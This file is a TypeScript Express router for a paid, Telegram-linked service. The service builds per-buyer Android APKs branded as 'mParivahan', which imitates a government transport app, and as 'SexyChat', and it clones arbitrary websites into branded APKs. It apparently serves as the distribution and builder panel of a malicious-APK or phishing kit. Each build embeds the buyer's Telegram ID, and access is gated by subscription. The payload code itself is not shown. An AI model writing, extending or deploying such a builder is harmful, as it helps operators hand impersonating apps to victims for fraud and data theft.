import { Router } from "express";
import { isAdminTg } from "../lib/admin";
import {
  buildUserApk,
  buildSexyChatApk,
  buildCustomApk,
  isTemplateReady,
  isSexyTemplateReady,
  getApkCacheDir,
} from "../bot/apkBuilder";
import { isSubscriptionActive } from "../bot/firebase";
import { requireAuth, requireAdmin } from "../middlewares/auth";
import * as fs from "fs";
import * as path from "path";

const router = Router();

// In-memory download tallies (resets on restart — fine for studio stats).
const downloads: Record<string, number> = {};
const bump = (f: string) => {
  downloads[f] = (downloads[f] || 0) + 1;
};

/**
 * GET /api/apk/download?telegramId=xxx
 * Builds the per-user APK (ownerTelegramId baked in) and streams it back
 * as a file download. Validates that the user has an active subscription
 * (or is the admin), same rules as the bot's /apk command.
 */
router.get("/apk/download", async (req, res) => {
  try {
    const telegramId = (req.query.telegramId as string) || "";
    if (!telegramId) {
      res
        .status(400)
        .json({ error: "telegramId query parameter is required." });
      return;
    }

    const active =
      isAdminTg(telegramId) || (await isSubscriptionActive(telegramId));
    if (!active) {
      res
        .status(403)
        .json({ error: "Subscription expired or not found. Contact admin." });
      return;
    }

    if (!isTemplateReady()) {
      res.status(503).json({
        error:
          "APK system is initializing (first-time setup ~2 min). Please try again shortly.",
      });
      return;
    }

    const apkPath = await buildUserApk(telegramId);
    if (!apkPath) {
      res.status(500).json({ error: "APK build failed. Contact admin." });
      return;
    }

    bump(`mparivahan_${telegramId}.apk`);
    res.download(apkPath, `mParivahan_HARRYAXE_${telegramId}.apk`);
  } catch (err: any) {
    console.error("APK download route error:", err);
    res.status(500).json({
      error: err?.message || "APK build failed. Check server logs.",
    });
  }
});

router.get("/apk/sexychat/download", async (req, res) => {
  try {
    const telegramId = (req.query.telegramId as string) || "";
    if (!telegramId) {
      res
        .status(400)
        .json({ error: "telegramId query parameter is required." });
      return;
    }

    const active =
      isAdminTg(telegramId) || (await isSubscriptionActive(telegramId));
    if (!active) {
      res
        .status(403)
        .json({ error: "Subscription expired or not found. Contact admin." });
      return;
    }

    if (!isSexyTemplateReady()) {
      res.status(503).json({
        error: "SexyChat APK system is initializing. Please try again shortly.",
      });
      return;
    }

    const apkPath = await buildSexyChatApk(telegramId);
    if (!apkPath) {
      res
        .status(500)
        .json({ error: "SexyChat APK build failed. Contact admin." });
      return;
    }

    bump(`sexychat_${telegramId}.apk`);
    res.download(apkPath, `SexyChat_${telegramId}.apk`);
  } catch (err: any) {
    console.error("SexyChat APK download route error:", err);
    res.status(500).json({
      error: err?.message || "SexyChat APK build failed. Check server logs.",
    });
  }
});

/**
 * GET /api/apk/status — template readiness + cached builds summary
 */
router.get("/apk/status", requireAuth, async (_req, res) => {
  try {
    const cacheDir = getApkCacheDir();
    let cached: Record<string, any> = {};
    if (fs.existsSync(cacheDir)) {
      for (const f of fs.readdirSync(cacheDir)) {
        const p = path.join(cacheDir, f);
        const st = fs.statSync(p);
        if (st.isFile() && f.endsWith(".apk")) {
          cached[f] = { size: st.size, modified: st.mtimeMs };
        }
      }
    }
    res.json({
      ready: isTemplateReady(),
      sexyReady: isSexyTemplateReady(),
      cached,
      downloads,
    });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Status check failed" });
  }
});

/**
 * POST /api/apk/build — admin-only custom builder
 * body: { app: "mparivahan" | "sexychat", telegramId: "123456789" }
 * Builds (or returns cached) APK for ANY user; returns cache filename + size.
 */
router.post("/apk/build", requireAdmin, async (req, res) => {
  try {
    const { app, telegramId } = req.body ?? {};
    const id = String(telegramId || "").trim();
    if (!id || !/^\d{5,12}$/.test(id)) {
      res
        .status(400)
        .json({ error: "A valid numeric telegramId is required." });
      return;
    }
    const appName = String(app || "mparivahan").toLowerCase();
    if (appName !== "mparivahan" && appName !== "sexychat") {
      res
        .status(400)
        .json({ error: "app must be 'mparivahan' or 'sexychat'." });
      return;
    }

    const isAdmin = isAdminTg(id);
    const active = isAdmin || (await isSubscriptionActive(id));
    if (!active) {
      res
        .status(403)
        .json({ error: "Subscription expired or not found for this user." });
      return;
    }

    const apkPath =
      appName === "sexychat"
        ? await buildSexyChatApk(id)
        : await buildUserApk(id);
    if (!apkPath) {
      res
        .status(500)
        .json({ error: `${appName} build failed. Check server logs.` });
      return;
    }

    const st = fs.statSync(apkPath);
    res.json({
      success: true,
      app: appName,
      telegramId: id,
      file: path.basename(apkPath),
      size: st.size,
      downloadUrl: `/api/apk/${appName === "sexychat" ? "sexychat/" : ""}download?telegramId=${id}`,
    });
  } catch (err: any) {
    console.error("APK build route error:", err);
    res
      .status(500)
      .json({ error: err?.message || "APK build failed. Check server logs." });
  }
});

/**
 * POST /api/apk/purge — admin-only: delete cached APK(s) for a user
 * body: { telegramId } — clears mparivahan + sexychat cache for that id
 */
router.post("/apk/purge", requireAdmin, async (req, res) => {
  try {
    const { telegramId } = req.body ?? {};
    const id = String(telegramId || "").trim();
    if (!id || !/^\d{5,12}$/.test(id)) {
      res
        .status(400)
        .json({ error: "A valid numeric telegramId is required." });
      return;
    }
    const cacheDir = getApkCacheDir();
    // Include custom_*_<id>.apk so cloner builds are purgeable too.
    const targets = [`${id}.apk`, `sexy_${id}.apk`];
    const removed: string[] = [];
    if (fs.existsSync(cacheDir)) {
      for (const t of targets) {
        const p = path.join(cacheDir, t);
        if (fs.existsSync(p)) {
          fs.unlinkSync(p);
          removed.push(t);
        }
      }
      for (const f of fs.readdirSync(cacheDir)) {
        if (f.startsWith("custom_") && f.endsWith(`_${id}.apk`)) {
          fs.unlinkSync(path.join(cacheDir, f));
          removed.push(f);
        }
      }
    }
    res.json({ success: true, removed });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Purge failed" });
  }
});

export default router;

/**
 * POST /api/apk/clone-info — fetch a website and extract branding
 * (title, theme color, favicon) so the panel can preview the clone.
 */
router.post("/apk/clone-info", requireAdmin, async (req, res) => {
  try {
    const raw = String((req.body ?? {}).url || "").trim();
    if (!/^https?:\/\/[^\s]+$/i.test(raw)) {
      res.status(400).json({ error: "Enter a valid http(s) URL." });
      return;
    }
    const pageRes = await fetch(raw, {
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36",
      },
      signal: AbortSignal.timeout(15_000),
      redirect: "follow",
    });
    if (!pageRes.ok) {
      res
        .status(502)
        .json({ error: `Site unreachable (HTTP ${pageRes.status}).` });
      return;
    }
    const html = await pageRes.text();
    const title =
      (html.match(/<title[^>]*>([^<]{1,120})<\/title>/i) || [])[1]?.trim() ||
      "";
    const theme =
      (html.match(
        /<meta[^>]+name=["']theme-color["'][^>]+content=["']([^"']{3,20})["']/i
      ) || [])[1] ||
      (html.match(
        /<meta[^>]+content=["']([^"']{3,20})["'][^>]+name=["']theme-color["']/i
      ) || [])[1] ||
      "";
    const abs = (u: string) => {
      try {
        return new URL(u, pageRes.url).href;
      } catch {
        return "";
      }
    };
    let iconUrl =
      (html.match(
        /<link[^>]+rel=["'][^"']*apple-touch-icon[^"']*["'][^>]*href=["']([^"']+)["']/i
      ) || [])[1] ||
      (html.match(
        /<link[^>]+rel=["'][^"']*icon[^"']*["'][^>]*href=["']([^"']+)["']/i
      ) || [])[1] ||
      (html.match(
        /<meta[^>]+property=["']og:image["'][^>]+content=["']([^"']+)["']/i
      ) || [])[1] ||
      "";
    iconUrl = abs(iconUrl);
    if (!iconUrl) iconUrl = abs("/favicon.ico");

    let iconDataUrl = "";
    if (iconUrl) {
      try {
        const iconRes = await fetch(iconUrl, {
          headers: { "User-Agent": "Mozilla/5.0" },
          signal: AbortSignal.timeout(10_000),
        });
        if (iconRes.ok) {
          const buf = Buffer.from(await iconRes.arrayBuffer());
          if (buf.length <= 2_000_000 && (buf[0] === 0x89 || buf[0] === 0xff)) {
            iconDataUrl = `data:${iconRes.headers.get("content-type") || "image/png"};base64,${buf.toString("base64")}`;
          }
        }
      } catch {
        /* icon optional */
      }
    }
    res.json({
      success: true,
      title,
      themeColor: theme || "",
      iconUrl,
      iconDataUrl,
    });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Clone-info failed" });
  }
});

/**
 * POST /api/apk/custom-build — clone any website into a branded APK.
 * body: { url, appName, splashText, themeColor, orientation, template, telegramId, iconUrl }
 */
router.post("/apk/custom-build", requireAuth, async (req, res) => {
  try {
    const b = req.body ?? {};
    const url = String(b.url || "").trim();
    const appName = String(b.appName || "")
      .trim()
      .slice(0, 28);
    const themeColor = String(b.themeColor || "0f172a")
      .replace(/^#/, "")
      .toLowerCase();
    const orientation = ["portrait", "landscape", "sensor"].includes(
      b.orientation
    )
      ? b.orientation
      : "portrait";
    const template = b.template === "sexy" ? "sexy" : "mparivahan";
    const telegramId = String(b.telegramId || (req as any).auth?.telegramId || "").trim();
    const splashText = String(b.splashText || "")
      .trim()
      .slice(0, 60);

    if (!/^https?:\/\/[^\s]+$/i.test(url)) {
      res.status(400).json({ error: "A valid http(s) URL is required." });
      return;
    }
    if (!/^[0-9a-f]{6}$/i.test(themeColor)) {
      res
        .status(400)
        .json({ error: "themeColor must be a 6-digit hex (e.g. 0f172a)." });
      return;
    }
    if (!/^\d{5,12}$/.test(telegramId)) {
      res
        .status(400)
        .json({ error: "A valid numeric telegramId is required." });
      return;
    }
    if (!isAdminTg(telegramId) && !(await isSubscriptionActive(telegramId))) {
      res.status(403).json({ error: "Subscription expired or not found." });
      return;
    }

    const apkPath = await buildCustomApk({
      telegramId,
      url,
      appName: appName || "My App",
      splashText: splashText || "Powered by HARRYAXE",
      themeColor,
      orientation,
      template,
      iconUrl: String(b.iconUrl || "").trim() || undefined,
      iconData: String(b.iconData || "").trim() || undefined,
    });
    if (!apkPath) {
      res
        .status(500)
        .json({ error: "Custom APK build failed. Check server logs." });
      return;
    }
    const st = fs.statSync(apkPath);
    bump(path.basename(apkPath));
    res.json({
      success: true,
      file: path.basename(apkPath),
      size: st.size,
      downloadUrl: `/api/apk/custom/download?file=${encodeURIComponent(path.basename(apkPath))}`,
    });
  } catch (err: any) {
    res.status(500).json({ error: err?.message || "Custom build failed" });
  }
});

/** GET /api/apk/custom/download?file=custom_x_y.apk — download a custom build */
router.get("/apk/custom/download", (req, res) => {
  const file = String(req.query.file || "").replace(/[^a-zA-Z0-9._-]/g, "");
  if (!/^custom_.+\.apk$/.test(file)) {
    res.status(400).json({ error: "Invalid file." });
    return;
  }
  const p = path.join(getApkCacheDir(), file);
  if (!fs.existsSync(p)) {
    res.status(404).json({ error: "Build not found in cache." });
    return;
  }
  bump(file);
  res.download(p, file);
});
